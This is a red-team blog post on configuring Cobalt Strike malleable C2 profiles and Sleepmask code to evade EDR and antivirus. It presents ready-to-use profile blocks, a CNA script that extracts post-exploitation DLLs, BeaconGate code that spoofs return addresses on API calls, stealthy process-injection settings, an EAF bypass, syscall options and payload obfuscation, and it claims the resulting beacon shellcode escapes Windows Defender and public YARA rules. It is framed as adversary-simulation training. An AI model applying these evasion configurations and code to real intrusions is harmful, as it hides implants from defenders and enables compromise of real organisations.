# https://whiteknightlabs.com/2025/05/19/harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion-part-2/

![White Knight Labs Training Bundle](https://whiteknightlabs.com/wp-content/uploads/2025/12/WKL_Click-Here_R1-01.jpg)[Full Bundle](https://buy.stripe.com/5kQcN55DFb5K8Rggfg9IQ0t "Full Bundle")[2 Class Bundle](https://buy.stripe.com/5kQbJ14zB7Ty8Rg9QS9IQ0y "2 Class Bundle")[3 Class Bundle](https://buy.stripe.com/fZu8wPc235Lq3wW0gi9IQ0x "3 Class Bundle")

[![White Knight Labs Logo](https://whiteknightlabs.com/wp-content/uploads/2024/08/Logo-v2.png)](https://whiteknightlabs.com/)

Menu

Edit Template

# Harnessing the Power of Cobalt Strike Profiles for EDR Evasion – Part 2

- Jake Mayhew
- May 19, 2025
- Uncategorized

This blog post is a continuation of the previous entry “ [Harnessing the Power of Cobalt Strike Profiles for EDR Evasion](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/)“, we covered the malleable profile aspects of Cobalt Strike and its role in security solution evasion. Since the release of version 4.9, Cobalt Strike has introduced a number of significant updates aimed at improving operator flexibility, evasion techniques, and custom beacon implementation. In this post, we’ll dive into the latest features and enhancements, examining how they impact tradecraft and integrate into modern adversary simulation workflows.

We will build an OPSEC-safe malleable C2 profile that incorporates the latest best practices and features. All codes and scripts referenced throughout this post are available on our [GitHub repository](https://github.com/WKL-Sec/Malleable-CS-Profiles).

## CS 4.9 – Post-Exploitation DLLs

Cobalt Strike 4.9 introduces a new malleable C2 option, **post-ex.cleanup**. This option specifies whether or not to clean up the post-exploiation reflective loader memory when the DLL is loaded.

Our initial attempt was to extract the post-exploitation DLLs within the Cobaltstrike JAR file:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/cs_decompile.png)Figure 1 – Decompiled Cobalt Strike client JAR

Upon checking for strings, nothing was detected as the DLLs are encrypted.

When checking the documentation, we stumbled upon the [POSTEX\_RDLL\_GENERATE](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm#POSTEX_RDLL_GENERATE) hook. This hook takes place when the beacon is tasked to perform a post exploitation task such as keylogging, taking a screenshot, run Mimikatz, etc. According to the documentation, the raw Post-ex DLL binary is passed as the second argument. So we created a simple script, to save its value to the disk:

```
sub print_info {
   println(formatDate("[HH:mm:ss] ") . "\cE[UDRL-VS]\o " . $1);
}

print_info("Post Exploitation Loader loaded");

set POSTEX_RDLL_GENERATE {
    local('$dllName $postex $file_handle');

    $dllName = $1;
    $postex = $2;

    # Leave only the DLL name without the folder
    $dllName = replace($dllName, "resources/", "");

    print_info("Saving " . $dllName . " to disk...");
    $file_handle = openf(">" . $dllName);
    writeb($file_handle, $postex);
    closef($file_handle);

    print_info("Done! Payload Size: " . strlen($postex));

    return $postex;
}
```

Load the CNA script to the Cobal Strike client, and task the beacon to perform a post-exploitation task (this case a screenshot):

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250505153652.png)Figure 2 – Exported raw post-exploitation DLL to disk

Tasking the beacon with all the possible post-exploitation tasks, will provided us all the 10 post-ex DLLs:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250505155349.png)Figure 3 – Post-exploitation DLLs in disk

After extracting the DLLs, find all the strings within. We come up with the following set of profile configuration (shortened for readability) on preventing any potential static detection:

```
post-ex {
    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";

    transform-x64 {
        strrepex "PortScanner" "Scanner module is complete" "";
        strrepex "PortScanner" "(ICMP) Target" "pmci trg=";
        strrepex "PortScanner" "is alive." "is up.";
        strrepex "PortScanner" "(ARP) Target" "rpa trg=";
        #...
        #...
        #...
    }

    transform-x86 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }
}
```

The full profile with all the found strings can be found [here](https://github.com/WKL-Sec/Malleable-CS-Profiles/tree/main/Profiles).

**Note**: It is highly recommended to replace the plaintext strings with something meaningful to the operator, since the changes will be outputted during or after the post-exploitation job. For example, in the image below we modified the string to show them in reverse during a port scan:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Screenshot-from-2025-05-18-22-55-28.png)Figure 4 – Modified strings are displayed to the operator during/after the tasked Post-Ex job

## Beacon Data Store

Beacon data store allows us to stored items to be executed multiple times without having to resend the item. The default data store size is 16 entries, although this can be modified by configuring the **stage.data\_store\_size** option within your Malleable C2 profile to match your needs:

```
stage {
    set data_store_size "32";
}
```

## WinHTTP Support

Even though there is a new profile option to set a default internet library, we will not be including the option in our profile. The reason is that both libraries are heavily [monitored](https://github.dev/elastic/protections-artifacts/tree/main) from security solutions and there is no difference in terms of evasion between the libraries. What matters, is a good red team infrastructure which bypasses the network and memory detection.

However, if you prefer to using a specific library (in this case `winhttp.dll`), the following option can be applied to the profile:

```
http-beacon {
    set library "winhttp";
}
```

## CS 4.10 – BeaconGate

BeaconGate is a feature that instructs Beacon to intercept supported API calls via a custom Sleep Mask. This allows the developer to implement advanced evasion techniques without having to gain control over Beacon’s API calls through IAT hooking in a UDRL, a method that is both complex and difficult to execute.

It is recommended that you have the profile configured to proxy all the [23 functions](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-gate.htm) that Cobalt Strike currently supports (as of 4.11). This can be done by setting the new `stage.beacon_gate` Malleable C2 option, as demonstrated below:

```
stage {
    set sleep_mask      "true";
    set syscall_method "indirect";
    beacon_gate {
        All;
    }
}
```

The profile will also enable the use of BeaconGate where we later start playing with it. This is crucial, otherwise the changes will not be applied to exported Beacons.

To get started, we need to work with [Sleepmask-VS](https://github.com/Cobalt-Strike/sleepmask-vs) project from Fortra’s repository. If you prefer the Linux environment for development, you can use the [Artifact Kit](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/artifacts-antivirus_artifact-kit-main.htm) template instead.

The `BeaconGateWrapper` function in `/library/gate.cpp` is where these API calls are handled. The following demo code checks if the the `VirtualAlloc` function is called. This enabled us to intercept the execution flow and add the evasion mechanism(s):

```
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
    // Is the function VirtualAlloc?
    if (functionCall->function == VIRTUALALLOC) {
       // ...
       // Do something fancy here
       // ...
    }

    // Execxute original function pointer
    BeaconGate(functionCall);

    return;
}
```

The same can be applied for all the other supported high-level API functions.

In this example, we are going to implement callback spoofing mechanism. Since the goal of this blog is to explain how the BeaconGate implementation works, we will use the [HulkOperator’s code](https://github.com/HulkOperator/Spoof-RetAddr) for the spoofing mechanism.

The custom [SetupConfig function](https://github.com/HulkOperator/Spoof-RetAddr/blob/main/spoof.h#L37) expects a function pointer to spoof. This can be achieved by utilizing the `functionCall` structure. The `functionPtr` field holds the pointer to the WinAPI function you want to hook. To access the function’s name, you can use `functionCall->function`, and for the number of arguments, use `functionCall->numOfArgs`. Individual argument values can be retrieved via `functionCall->args[i]`.

Here’s a proof of concept showing how the final code looks:

```
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
    STACK_CONFIG Config_1;
    UINT64 pGadget;

    pGadget = FindGadget();

    if (functionCall->bMask == TRUE) {
        MaskBeacon(&info->beacon_info);
    }

    // If the function has 1 argument (could be ExitThread for example)
    if (functionCall->numOfArgs == 1) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0]);
        Spoof(&Config_1);
    }

    // If the function has 2 arguments
    if (functionCall->numOfArgs == 2) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1]);
        Spoof(&Config_1);
    }

    // ... Apply the same logic for the other functions

    // If the function has 10 arguments
    if (functionCall->numOfArgs == 10) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5], functionCall->args[6], functionCall->args[7], functionCall->args[8], functionCall->args[9]);
        Spoof(&Config_1);
    }

    BeaconGate(functionCall);

    if (functionCall->bMask == TRUE) {
        UnMaskBeacon(&info->beacon_info);
    }

    return;
}
```

Next time you export a Beacon, the spoof mechanism will be applied. The final implementation code can be found [here](https://github.com/WKL-Sec).

## CS 4.11 – Novel Process Injection

Cobalt Strike 4.11 introduced a custom process injection technique, `ObfSetThreadContext`. This injection technique, bypasses the modern detection of injected threads (where the start address of a thread is not backed by a Portable Executable image on disk) by making the use of various gadgets to redirect execution.

By default, this new option will automatically set the injected thread start address as the (legitimate) remote image entry point, but can be additionally [configured](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm?__hstc=173638140.fedfa50a0a1a1b17eaec23450f3c49c4.1734034108952.1744980287412.1744980952479.11&__hssc=173638140.2.1744980952479&__hsfp=1332038603) with custom module and offset as shown below:

```
process-inject {
  execute {
      ObfSetThreadContext "ntdll!TpReleaseCleanupGroupMembers+0x450";
      CreateThread "ntdll!RtlUserThreadStart";
      NtQueueApcThread-s;
      SetThreadContext;
      CreateThread;
      CreateRemoteThread;
      RtlCreateUserThread;
  }
}
```

The option above sets `ObfSetThreadContext` as the default process injection technique. The next injection techniques servers as a backup when the default injection technique fails. This happens on certain cases (i.e. x86 -> x64 injection, self-injection etc.)

## CS 4.11 – sRDI with evasion capabilities

According to Fortra, the version 4.11 ports Beacon’s default reflective loader to a new prepend/ [**sRDI**](https://github.com/monoxgas/sRDI) style loader with several new evasive features added.

sRDI enables the transformation of DLL files into position-independent shellcode. It functions as a comprehensive PE loader, handling correct section permissions, TLS callbacks, and various integrity checks. Essentially, it’s a shellcode-based PE loader integrated with a compressed DLL.

First, a new EAF bypass [option](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_pe-memory-indicators.htm?__hstc=173638140.fedfa50a0a1a1b17eaec23450f3c49c4.1734034108952.1744980287412.1744980952479.11&__hssc=173638140.2.1744980952479&__hsfp=1332038603) is introduced `stage.set eaf_bypass`. In September of 2010, Microsoft released their [Enhanced Mitigation Experience Toolkit](https://www.microsoft.com/en-us/download/details.aspx?id=48240) (EMET), which includes a new mitigation called Export address table Address Filter (EAF). Nowadays, this option is implemented on Microsoft Defender and can be enabled under the _App & browser control_ -\> _Exploit protection_ tab for specific program(s) only:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/image-1.png)Figure 5 – EAF enabled for specific program(s)

This is effective againts Windows shellcode, which relies on export address table (EAT), due to lack of IAT (Import Address Table). The bypass technique remains close-source, however according to the documentation, PrependLoader leverage gadgets inside of Windows system DLLs to bypass checks when reading Export.

Second, there is support for indirect syscalls `stage.set rdll_use_syscalls`) which is another great evasive feature to have part of the profile.

From our various testings we recommend the following set of rules to apply in the profile:

```
stage {
	set rdll_loader "PrependLoader";
	set rdll_use_syscalls "true";
	set eaf_bypass "true";
}
```

Lastly, there is support for automatically applying complex obfuscation routines to Beacon payloads (`stage.transform-obfuscate {}`). This protect the beacon against common signature detections.

```
    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        base64;     # encodes using base64 encoding
    }
```

`rdll_loader` can also be set to `StompLoader`, however the use of `PrependLoader` has the benefits of the implementation`rdll_use_syscalls`, the use of `eaf_bypass` and the `stage.transform-obfuscate` option which performs obfuscation to the Beacon DLL payload for the prepend loader.

Combining all the stage options from earlier, we get the following stage profile:

```
stage {
    set sleep_mask      "true";
    set syscall_method "indirect";
    beacon_gate {
        All;
    }

	set rdll_loader "PrependLoader";
	set rdll_use_syscalls "true";
	set eaf_bypass "true";

    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        base64;     # encodes using base64 encoding
    }
}
```

## Beacon strings

Since our previous coverage of Cobalt Strike 4.8, recent updates have introduced significant changes to the beacon, including modifications to its strings. The exported shellcode now excludes any strings that operators would have previously removed manually using the profile. As a result of this change along with other enhancements from the last three updates, the raw shellcode with the applied profile is no longer detectable by Windows Defender:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250505102503.png)Figure 6 – Scan output showing the raw Beacon shellcode not detected from Windows Defender

The exported shellcode doesn’t get detected by any of the most common YARA rules (considering that they haven’t been updated since 2022):

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250505101850.png)Figure 7 – Scan output showing the raw Beacon in shellcode format not detected by any of the public YARA rule

## Bonus 1: Magic MZ Header

As mentioned in our [previous blogpost](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/), `magic_mz_x64` and `magic_mz_x86` are very important profile options when it comes to bypassing signature detection. They are responsible for changing the MZ PE header which are not obfuscated as the reflective loading process depends on them. We need to change its values, however we cannot simply put some random values to it due to OPSEC reasons. As the [official documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_pe-memory-indicators.htm#_Toc65482855) suggests, one can change these values by providing a set of 2 (for x64) or 4(for x86) assembly instructions. The condition for the assembly instructions is that the resultant should be a no operation.

To automate this process, we have created a simple [Python script](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/magic_mz.py) which automates the process of compiling x86 and /x64 NOP-alternative instructions using `nasm` and print out the ASCII values in a ready-to-use profile format as shown below:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250430002427.png)Figure 8 – Python script generating magic MZ Header, ready to use for the Cobalt Strike profile

## Bonus 2: DLL parsing

This part is important if you want to make the beacon reflected DLL looks like a system DLL. To automate this process, we developed a simple [python script](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/dll_parse.py) which parses the given DLL, in order to generate a ready-to-use Cobalt Strike profile like shown in the image below:

![](https://whiteknightlabs.com/wp-content/uploads/2025/05/Pasted-image-20250502125920.png)Figure 9 – Python script parsing DLL values, ready to use for the Cobalt Strike profile

## Conclusion

The last three updates has introduced a lot of flexibility for the operator. From post-exploitation DLL string removal, ability to hook high-level API via BeaconGate, the introduction of PrependLoader and its evasive features and much more, makes Cobalt Strike a more ready-to-use tool and a more customizable one.

All the scripts and the final profiles used for bypasses are published in our [Github repository](https://github.com/WKL-Sec/Malleable-CS-Profiles) and made use of in our [Offensive Development (ODPC)](https://training.whiteknightlabs.com/live-training/offensive-development-practitioner-certification/) and [Advanced Red Team Operations (ARTO)](https://training.whiteknightlabs.com/live-training/advanced-red-team-operations-certification/) courses.

## References

[https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome\_main.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)

[https://github.com/HulkOperator/Spoof-RetAddr](https://github.com/HulkOperator/Spoof-RetAddr)

#### Recent Posts

- [Backdooring Electron Applications](https://whiteknightlabs.com/2026/01/20/backdooring-electron-applications/)
- [UEFI Vulnerability Analysis Using AI Part 3: Scaling Understanding, Not Just Context](https://whiteknightlabs.com/2026/01/13/uefi-vulnerability-analysis-using-ai-part-3-scaling-understanding-not-just-context/)
- [The New Chapter of Egress Communication with Cobalt Strike User-Defined C2](https://whiteknightlabs.com/2026/01/06/the-new-chapter-of-egress-communication-with-cobalt-strike-user-defined-c2/)
- [UEFI Vulnerability Analysis using AI Part 2: Breaking the Token Barrier](https://whiteknightlabs.com/2025/12/30/uefi-vulnerability-analysis-using-ai-part-2-breaking-the-token-barrier/)
- [Just-in-Time for Runtime Interpretation - Unmasking the World of LLVM IR Based JIT Execution](https://whiteknightlabs.com/2025/12/23/just-in-time-for-runtime-interpretation-unmasking-the-world-of-llvm-ir-based-jit-execution/)

#### Recent Comments

### Let’s Chat

#### Strengthen your digital stronghold.

![desigen](https://whiteknightlabs.com/wp-content/uploads/2024/08/desigen-1.png)

Reach out to us today and discover the potential of bespoke cybersecurity solutions designed to reduce your business risk.

What is 9 + 8 ? ![Refresh icon](https://whiteknightlabs.com/wp-content/plugins/ds-cf7-math-captcha/assets/img/icons8-refresh-30.png)![Refreshing captcha](https://whiteknightlabs.com/wp-content/plugins/ds-cf7-math-captcha/assets/img/446bcd468478f5bfb7b4e5c804571392_w200.gif)

Answer for 9 + 8

reCAPTCHA

Recaptcha requires verification.

I'm not a robot

reCAPTCHA

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

[![footer logo](https://whiteknightlabs.com/wp-content/uploads/2024/08/footer-logo.png)](https://whiteknightlabs.com/)

[Linkedin-in](https://www.linkedin.com/company/white-knight-labs/)[X-twitter](https://twitter.com/WKL_cyber)[Discord](https://discord.gg/qRGBT2TcEV)

#### [Call: 877-864-4204](tel:877-864-4204)

#### [Email: sales@whiteknightlabs.com](mailto:sales@whiteknightlabs.com)

#### [Send us a message](https://whiteknightlabs.com/2025/05/19/harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion-part-2/\#chat)

#### Assessment

- [VIP Home Security](https://whiteknightlabs.com/vip-home-cybersecurity-assessments)
- [Password Audit](https://whiteknightlabs.com/password-audit-service)
- [Embedded Devices](https://whiteknightlabs.com/embedded-security-testing)
- [OSINT](https://whiteknightlabs.com/osint-services)
- [AD Assessment](https://whiteknightlabs.com/active-directory-security-assessment)
- [Dark Web Scanning](https://whiteknightlabs.com/dark-web-scanning)
- [Smart Contract Audit](https://whiteknightlabs.com/smart-contract-audit)

#### Penetration Testing

- [Network Penetration Test](https://whiteknightlabs.com/network-penetration-testing-services)
- [Web App Penetration Test](https://whiteknightlabs.com/web-application-penetration-testing)
- [Mobile App Penetration Test](https://whiteknightlabs.com/mobile-application-penetration-testing)
- [Wireless Penetration Test](https://whiteknightlabs.com/wireless-penetration-testing)
- [Cloud Penetration Test](https://whiteknightlabs.com/cloud-penetration-testing)
- [Physical Penetration Testing](https://whiteknightlabs.com/physical-penetration-testing/)

#### Simulation and Emulation

- [Red Team – Adversarial Emulation](https://whiteknightlabs.com/red-team-engagements)
- [Social Engineering Attack Simulation](https://whiteknightlabs.com/social-engineering-testing)
- [Ransomware Attack Simulation](https://whiteknightlabs.com/ransomware-attack-simulation)

#### Compliance and Advisory

- [Framework Consulting](https://whiteknightlabs.com/framework-consulting)
- [Gap Assessments](https://whiteknightlabs.com/gap-assessments)
- [Compliance-as-a-Service](https://whiteknightlabs.com/compliance-as-a-service-caas)
- [DevSecOps Engineering](https://whiteknightlabs.com/devsecops-engineering)

#### Incident Response

- [Incident Response](https://whiteknightlabs.com/incident-response)

#### Copyright © 2026 White Knight Labs \| All rights reserved

#### [Contact Us](https://whiteknightlabs.com/contact-us/)

Edit Template

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)